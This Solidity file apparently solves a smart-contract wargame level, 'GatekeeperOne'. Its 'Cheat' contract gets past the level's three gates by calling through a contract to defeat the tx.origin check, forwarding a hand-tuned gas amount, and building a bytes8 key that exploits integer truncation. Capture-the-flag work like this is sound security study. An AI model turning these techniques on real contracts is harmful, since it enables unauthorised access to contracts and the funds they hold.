pragma solidity ^0.4.18;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Cheat{
    
    GatekeeperOne gk;
    
    function Cheat(address target){
        gk = GatekeeperOne(target);
    }
    
    function cheat(){
        uint64 addr = uint16(msg.sender);
        addr = addr + 2**33;   // uint16(msg.sender) + 2^33, uint32 and uint16 are the same but uint64 are not
        gk.enter.gas(32979)(bytes8(addr)); // gas = 8191 * 4 + gas spent up to the point of the comparison, 32979
        
        
    }
    
    
}